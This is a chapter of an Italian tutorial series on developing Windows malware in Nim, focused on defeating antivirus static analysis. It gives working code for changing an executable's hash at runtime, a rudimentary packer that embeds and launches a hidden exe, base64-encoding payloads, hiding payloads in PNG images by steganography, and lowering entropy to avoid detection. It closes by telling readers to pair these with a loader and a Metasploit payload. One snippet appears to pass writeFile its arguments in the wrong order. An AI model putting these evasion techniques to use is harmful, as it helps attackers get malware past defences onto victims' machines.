# Capitolo 4: analisi statica

Questo è il quarto capitolo di una serie dedicata al malware developing su Windows. Andremo a vedere e implementare tecniche per creare malware e nasconderlo. Verrà usato principalmente [Nim](https://nim-lang.org/) come linguaggio d programmazione (è sottointeso che dovresti conoscerne _almeno_ le basi e averci fatto un progetto sopra)

## Cos'è l'analisi statica?

L'analisi statica consiste nell'analizzare il file senza eseguirlo per tracciarne i comportamenti. Invece, l'analisi statica prevede il controllo del contenuto del file e verificare se certi dettagli corrispondono con altri dettagli appartenenti a dei noti malware. L'analisi statica è di solito un requisito per ogni antivirus ed è un problema fondamentale da risolvere per qualsiasi red teamer.

## Come confondere i sistemi di analisi statica?

Dato che l'analisi è appunto, statica, la strategia di controllare dettagli sul sistema è completamente inutile. Invece, bisogna rendere il payload il più diverso possibile dalla classica versione compilata con `nim c payload`.

## Impostazioni del compiler

Ci sono un paio di flags che ti consentono di modificare il risultato del tuo payload:

### Ottimizazione

Puoi usare `--opt` per ottimizzare il codice per velocità (`speed`) o dimensioni (`size`). L'ottimizazione è un bene per noi perchè, apparte cambiare la hash del file, rende l'assembly dell'output più conciso e comunque più difficile per essere valutato da un antivirus.

### Informazioni di debug

Puoi usare `-d:strip` per rimuovere informazioni per il debugging e altri metadati (un po' come `strip` su linux)

## Cambiare l'hash durante il runtime

Per cambiare l'hash di un exe, lo si può rinnominare con un altro processo e scrivere lo stesso exe più una stringa vuota (aggiungendo quindi un byte):

    import os
    import strformat
    import payloadModule

    let appName = relativePath(getAppFilename(), ".", '/')
    let newName = "test.pdf"

    if fileExists(newName):
        removeFile(newName)

    discard execShellCmd(fmt"""cmd /C rename "{appName}" "{newName}" """)

    let content = readFile(newName) & " "
    writeFile(appName, content)
    removeFile(appName)
    payload()
    discard execShellCmd(fmt"""cmd /C rename "{newName}" "{appName}" """)

...dove payload() è la funzione principale del payload importato con payloadModule. 

Per generare il nuovo processo possiamo usare uno shell command, perchè scrivere un altro exe sul disco è controintuitivo per il nostro scopo (avviare un solo exe)

## Wrapper rudimentale

In genere per nascondere la IAT (Import Address Table) o per far sembrare l'assembly di un malware dati senza senso, si "impacchetta" il malware in un wrapper. Possiamo evolvere il metodo di prima per creare un wrapper rudimentale:

    import os
    import strformat
    import osproc

    let appName = relativePath(getAppFilename(), ".", '/')
    let newName = "test.pdf"
    const toUnpack = staticRead("example.exe") 

    if fileExists(newName):
        removeFile(newName)

    discard execShellCmd(fmt"""cmd /C rename "{appName}" "{newName}" """)
    writeFile(appName, toUnpack)
    discard execProcess(appName)
    removeFile(appName)
    discard execShellCmd(fmt"""cmd /C rename "{newName}" "{appName}" """)

Questo codice sostituisce test.exe (con il metodo di prima) il contenuto di toUnpack, ovvero il contenuto di example.exe. Dopo che il payload ha ritornato l'output, il payload viene rimosso.

Chiaramente è consigliato criptare o almeno codificare il malware:

    import base64
    const toUnpack = encode(staticRead("example.exe"))  

**NOTA**: quando si vanno ad applicare misure contro l'analisi dinamica, come abbiamo visto nel capitolo 3, è intelligente applicarle sia al wrapper che al malware originale

## Steganografia delle risorse

Dato che qualunqua risorsa tu includi nel tuo codice può essere facilmente estratta con [Resource Hacker](https://resource-hacker.it.malavida.com/windows/) puoi nascondere delle risorse compromettenti dentro immagini innoque.

Useremo la libreria [steganography](https://github.com/treeform/steganography).

Per codificarle:

    import steganography, pixie

    var image = readImage("example.png")
    encodeMessage(image, readFile("example.exe"))
    image.writeFile("res.png")

Per decodificarle (dentro il malware):

    import os, steganography, pixie, strformat

    let temp = getEnv("TEMP")
    let decodePath = fmt"{temp}/res.png"

    const hidden = staticRead("res.png")
    writeFile(hidden, decodePath)
    let image = readImage(decodePath)
    let res = decodeMessage(image)

## Entropia

L'entropia è il valore della casualità dei caratteri in una stringa. Quando l'entropia di una sezione PE è troppo alta si sospetta che il software sia criptato e quindi pericoloso. Per evitare questo dopo aver criptato una risorsa è consigliato codificarla in una base non molto diffusa, in modo tale che il valore di entropia risulti più basso ma allo stesso tempo sia più difficile automare la decodifica.

## Complimenti

Prova ad implementare queste tecniche con il loader del capitolo 1 e un payload di Metasploit